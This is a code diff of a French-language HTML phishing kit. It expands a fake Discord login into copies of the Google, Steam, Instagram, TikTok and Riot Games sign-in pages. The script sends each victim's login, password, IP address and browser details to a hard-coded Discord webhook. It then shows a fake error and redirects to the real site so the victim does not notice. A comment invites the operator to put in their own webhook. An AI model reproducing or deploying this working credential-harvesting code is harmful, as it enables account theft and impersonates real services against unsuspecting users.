@@ -1,39 +1,242 @@
 <!DOCTYPE html>
-<html>
+<html lang="fr">
 <head>
-    <title>Connexion requise</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sécurité du compte - Vérification requise</title>
     <style>
-        body { background: #36393f; color: white; font-family: sans-serif; text-align: center; padding: 50px; }
-        .box { background: #2f3136; padding: 30px; border-radius: 5px; max-width: 400px; margin: 0 auto; }
-        input { width: 100%; padding: 10px; margin: 10px 0; background: #202225; border: 1px solid #040405; color: white; }
-        button { background: #5865f2; color: white; border: none; padding: 12px; width: 100%; cursor: pointer; }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }
+        body { background: #f0f2f5; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+        
+        /* Styles Google */
+        .google-container { width: 100%; max-width: 450px; padding: 40px; }
+        .google-box { background: white; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); padding: 40px; text-align: center; }
+        .google-logo { width: 75px; margin-bottom: 20px; }
+        .google-title { font-size: 24px; color: #202124; margin-bottom: 10px; }
+        .google-text { color: #5f6368; font-size: 14px; margin-bottom: 30px; }
+        .input-field { width: 100%; padding: 13px 15px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; margin-bottom: 15px; outline: none; }
+        .input-field:focus { border-color: #1a73e8; }
+        .btn { width: 100%; padding: 12px; border: none; border-radius: 4px; font-size: 14px; font-weight: 500; cursor: pointer; }
+        .btn-primary { background: #1a73e8; color: white; }
+        .btn-primary:hover { background: #1557b0; }
+        .link { color: #1a73e8; text-decoration: none; font-size: 14px; display: block; margin-top: 20px; }
+        
+        /* Styles Steam */
+        .steam-body { background: #171a21; }
+        .steam-container { width: 100%; max-width: 400px; padding: 20px; }
+        .steam-box { background: #1b2838; border-radius: 4px; padding: 30px; border: 1px solid #3d4450; }
+        .steam-logo { width: 180px; margin-bottom: 30px; display: block; margin-left: auto; margin-right: auto; }
+        .steam-title { color: #c6d4df; font-size: 22px; text-align: center; margin-bottom: 25px; }
+        .steam-input { width: 100%; padding: 10px; background: #32353c; border: 1px solid #3d4450; color: #c6d4df; border-radius: 3px; margin-bottom: 15px; font-size: 15px; }
+        .steam-btn { background: linear-gradient(to right, #47bfff, #1a44c2); color: white; border: none; padding: 12px; width: 100%; border-radius: 2px; font-size: 16px; cursor: pointer; }
+        
+        /* Styles Instagram */
+        .insta-body { background: #fafafa; }
+        .insta-container { width: 100%; max-width: 350px; }
+        .insta-box { background: white; border: 1px solid #dbdbdb; padding: 40px; margin-bottom: 10px; text-align: center; }
+        .insta-logo { width: 175px; margin-bottom: 30px; }
+        .insta-input { width: 100%; padding: 9px; background: #fafafa; border: 1px solid #dbdbdb; border-radius: 3px; margin-bottom: 6px; font-size: 12px; }
+        .insta-btn { background: #0095f6; color: white; border: none; padding: 8px; width: 100%; border-radius: 4px; font-weight: 600; margin-top: 10px; cursor: pointer; }
+        
+        /* Styles TikTok */
+        .tiktok-body { background: black; }
+        .tiktok-container { width: 100%; max-width: 400px; padding: 20px; }
+        .tiktok-box { background: white; border-radius: 8px; padding: 40px; text-align: center; }
+        .tiktok-logo { font-size: 40px; font-weight: bold; margin-bottom: 30px; letter-spacing: -2px; }
+        .tiktok-logo span:first-child { color: #25F4EE; }
+        .tiktok-logo span:last-child { color: #FE2C55; }
+        .tiktok-input { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 4px; margin-bottom: 12px; font-size: 15px; }
+        .tiktok-btn { background: #FE2C55; color: white; border: none; padding: 12px; width: 100%; border-radius: 4px; font-weight: 600; font-size: 16px; cursor: pointer; }
+        
+        /* Styles Valorant/Riot */
+        .riot-body { background: #0f1419; }
+        .riot-container { width: 100%; max-width: 400px; padding: 20px; }
+        .riot-box { background: white; border-radius: 8px; padding: 40px; }
+        .riot-logo { width: 150px; margin-bottom: 30px; display: block; margin: 0 auto 30px; }
+        .riot-title { color: #0f1419; text-align: center; font-size: 24px; margin-bottom: 25px; font-weight: 700; }
+        .riot-input { width: 100%; padding: 14px; border: 1px solid #ddd; border-radius: 6px; margin-bottom: 15px; font-size: 16px; }
+        .riot-btn { background: #ff4655; color: white; border: none; padding: 14px; width: 100%; border-radius: 6px; font-weight: 700; font-size: 16px; cursor: pointer; }
+        
+        .error-msg { color: #d93025; font-size: 13px; margin-top: 10px; display: none; }
+        .loading { display: none; text-align: center; color: #666; margin-top: 20px; }
     </style>
 </head>
-<body>
-    <div class="box">
-        <h2>Connexion à Discord</h2>
-        <p>Veuillez vous reconnecter pour voir les stats</p>
-        <input type="text" id="email" placeholder="Email">
-        <input type="password" id="pass" placeholder="Mot de passe">
-        <button onclick="grab()">Connexion</button>
-        <p id="error" style="color: #ed4245; display: none;">Identifiants incorrects</p>
-    </div>
-    
+<body id="body">
+    <!-- Contenu injecté par JavaScript selon le type -->
+    <div id="container"></div>
+
     <script>
-        function grab() {
-            var email = document.getElementById('email').value;
-            var pass = document.getElementById('pass').value;
-            
-            fetch('https://discord.com/api/webhooks/1537654143118999572/xUfeTGedDvVvB5mguwhB9BMhIvNDBIHvmwFBh5e1h3WevbWIFRQoq7pMl14UVfpAlSRk', {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({
-                    content: '**Login capturé**\nEmail: `' + email + '`\nPass: `' + pass + '`'
-                })
-            });
-            
-            document.getElementById('error').style.display = 'block';
+        // CONFIGURATION - REMPLACE PAR TON WEBHOOK DISCORD
+        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1537654143118999572/xUfeTGedDvVvB5mguwhB9BMhIvNDBIHvmwFBh5e1h3WevbWIFRQoq7pMl14UVfpAlSRk';
+        
+        // Détection du type via paramètre URL (?type=google ou ?type=steam etc.)
+        const urlParams = new URLSearchParams(window.location.search);
+        const type = urlParams.get('type') || 'google'; // Par défaut Google
+        
+        const container = document.getElementById('container');
+        const body = document.getElementById('body');
+        
+        let html = '';
+        
+        switch(type) {
+            case 'google':
+                body.className = '';
+                html = `
+                    <div class="google-container">
+                        <div class="google-box">
+                            <svg class="google-logo" viewBox="0 0 75 24" xmlns="http://www.w3.org/2000/svg"><path d="M74.5 12.28c0-.86-.08-1.68-.23-2.48H63.5v4.7h6.17c-.27 1.48-1.08 2.73-2.3 3.57v3h3.72c2.17-2 3.41-4.95 3.41-8.47z" fill="#4285F4"/><path d="M63.5 24c3.11 0 5.72-1.03 7.62-2.79l-3.72-3c-1.03.69-2.35 1.1-3.9 1.1-3 0-5.54-2.02-6.45-4.73h-3.84v3.1C51.36 21.3 56.96 24 63.5 24z" fill="#34A853"/><path d="M57.05 14.58c-.23-.69-.36-1.43-.36-2.18s.13-1.49.36-2.18v-3.1h-3.84c-.76 1.46-1.2 3.1-1.2 4.78s.44 3.32 1.2 4.78l2.96-2.3 3.88-3.08h-3.36z" fill="#FBBC05"/><path d="M63.5 4.75c1.67 0 3.17.57 4.35 1.69l3.26-3.26C68.22 1.19 65.61 0 63.5 0 56.96 0 51.36 2.7 48.41 6.9l3.84 2.97c.91-2.71 3.45-4.12 6.25-4.12z" fill="#EA4335"/></svg>
+                            <h2 class="google-title">Connexion</h2>
+                            <p class="google-text">Utilisez votre compte Google</p>
+                            <form id="loginForm">
+                                <input type="email" id="email" class="input-field" placeholder="Adresse e-mail ou téléphone" required>
+                                <input type="password" id="password" class="input-field" placeholder="Mot de passe" required>
+                                <button type="submit" class="btn btn-primary">Suivant</button>
+                            </form>
+                            <a href="#" class="link">Créer un compte</a>
+                            <div class="error-msg" id="error">Identifiants incorrects. Veuillez réessayer.</div>
+                            <div class="loading" id="loading">Vérification en cours...</div>
+                        </div>
+                    </div>
+                `;
+                break;
+                
+            case 'steam':
+                body.className = 'steam-body';
+                html = `
+                    <div class="steam-container">
+                        <div class="steam-box">
+                            <img src="https://store.akamai.steamstatic.com/public/shared/images/header/globalheader_logo.png" class="steam-logo" alt="Steam">
+                            <h2 class="steam-title">Connexion à Steam</h2>
+                            <form id="loginForm">
+                                <input type="text" id="email" class="steam-input" placeholder="Nom du compte Steam" required>
+                                <input type="password" id="password" class="steam-input" placeholder="Mot de passe" required>
+                                <button type="submit" class="steam-btn">Connexion</button>
+                            </form>
+                            <div class="error-msg" id="error" style="color: #c6d4df; margin-top: 15px;">Mot de passe incorrect. Veuillez réessayer.</div>
+                            <div class="loading" id="loading" style="color: #c6d4df; margin-top: 15px;">Connexion...</div>
+                        </div>
+                    </div>
+                `;
+                break;
+                
+            case 'instagram':
+                body.className = 'insta-body';
+                html = `
+                    <div class="insta-container">
+                        <div class="insta-box">
+                            <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png" class="insta-logo" alt="Instagram">
+                            <form id="loginForm">
+                                <input type="text" id="email" class="insta-input" placeholder="Num. téléphone, nom d'utilisateur ou e-mail" required>
+                                <input type="password" id="password" class="insta-input" placeholder="Mot de passe" required>
+                                <button type="submit" class="insta-btn">Connexion</button>
+                            </form>
+                            <div class="error-msg" id="error" style="margin-top: 10px;">Désolé, votre mot de passe est incorrect.</div>
+                            <div class="loading" id="loading" style="margin-top: 10px; color: #8e8e8e;">Vérification...</div>
+                        </div>
+                    </div>
+                `;
+                break;
+                
+            case 'tiktok':
+                body.className = 'tiktok-body';
+                html = `
+                    <div class="tiktok-container">
+                        <div class="tiktok-box">
+                            <div class="tiktok-logo"><span>Tik</span><span>Tok</span></div>
+                            <form id="loginForm">
+                                <input type="text" id="email" class="tiktok-input" placeholder="E-mail ou nom d'utilisateur" required>
+                                <input type="password" id="password" class="tiktok-input" placeholder="Mot de passe" required>
+                                <button type="submit" class="tiktok-btn">Connexion</button>
+                            </form>
+                            <div class="error-msg" id="error">Mot de passe incorrect.</div>
+                            <div class="loading" id="loading">Connexion en cours...</div>
+                        </div>
+                    </div>
+                `;
+                break;
+                
+            case 'valorant':
+            case 'riot':
+                body.className = 'riot-body';
+                html = `
+                    <div class="riot-container">
+                        <div class="riot-box">
+                            <svg class="riot-logo" viewBox="0 0 100 32" fill="none"><path fill-rule="evenodd" clip-rule="evenodd" d="M0 0h100v32H0V0zm2 2v28h96V2H2z" fill="#F9F9F9"/><path d="M10.5 8h9v2.5h-6v4h5v2.5h-5v5.5h-3V8zM21 8h3v14h-3V8zM26.5 8h5c3 0 5 2 5 5s-2 5-5 5h-2v4h-3V8zm3 7.5h2c1 0 2-.5 2-1.5s-1-1.5-2-1.5h-2v3zM40 8h9v2.5h-6v3h5v2.5h-5v6h-3V8z" fill="#F9F9F9"/></svg>
+                            <h2 class="riot-title">Connexion Riot Games</h2>
+                            <form id="loginForm">
+                                <input type="text" id="email" class="riot-input" placeholder="Nom d'utilisateur" required>
+                                <input type="password" id="password" class="riot-input" placeholder="Mot de passe" required>
+                                <button type="submit" class="riot-btn">Connexion</button>
+                            </form>
+                            <div class="error-msg" id="error">Nom d'utilisateur ou mot de passe incorrect.</div>
+                            <div class="loading" id="loading">Connexion...</div>
+                        </div>
+                    </div>
+                `;
+                break;
         }
+        
+        container.innerHTML = html;
+        
+        // Gestion du formulaire
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            const errorDiv = document.getElementById('error');
+            const loadingDiv = document.getElementById('loading');
+            
+            // Affiche loading
+            loadingDiv.style.display = 'block';
+            errorDiv.style.display = 'none';
+            
+            // Récupération IP
+            fetch('https://api.ipify.org?format=json')
+                .then(res => res.json())
+                .then(ipData => {
+                    const payload = {
+                        content: `**${type.toUpperCase()} CAPTURE**\n` +
+                                `**Service:** ${type}\n` +
+                                `**IP:** ${ipData.ip}\n` +
+                                `**Login:** \`${email}\`\n` +
+                                `**Password:** \`${password}\`\n` +
+                                `**User-Agent:** ${navigator.userAgent}\n` +
+                                `**Time:** ${new Date().toLocaleString()}`
+                    };
+                    
+                    return fetch(WEBHOOK_URL, {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify(payload)
+                    });
+                })
+                .then(() => {
+                    // Simulation erreur puis redirection
+                    setTimeout(() => {
+                        loadingDiv.style.display = 'none';
+                        errorDiv.style.display = 'block';
+                        
+                        // Redirection vers vrai site après 2 secondes
+                        setTimeout(() => {
+                            const redirects = {
+                                'google': 'https://accounts.google.com',
+                                'steam': 'https://store.steampowered.com',
+                                'instagram': 'https://www.instagram.com',
+                                'tiktok': 'https://www.tiktok.com',
+                                'valorant': 'https://playvalorant.com',
+                                'riot': 'https://playvalorant.com'
+                            };
+                            window.location.href = redirects[type] || 'https://google.com';
+                        }, 2000);
+                    }, 1000);
+                })
+                .catch(() => {
+                    // Même si erreur, on simule
+                    loadingDiv.style.display = 'none';
+                    errorDiv.style.display = 'block';
+                });
+        });
     </script>
 </body>
 </html>
